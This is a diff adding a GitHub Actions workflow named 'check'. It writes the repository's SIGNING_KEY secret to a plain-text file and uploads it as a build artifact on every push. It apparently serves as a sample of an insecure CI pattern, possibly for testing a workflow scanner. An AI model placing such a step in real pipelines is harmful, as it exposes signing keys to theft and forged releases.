@@ -1,0 +1,14 @@
+name: check
+on: push
+permissions: {}
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          SIGNING_KEY: ${{ secrets.SIGNING_KEY }}
+        run: mkdir out && printf '%s' "$SIGNING_KEY" > out/key.txt
+      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
+        with:
+          name: out
+          path: out
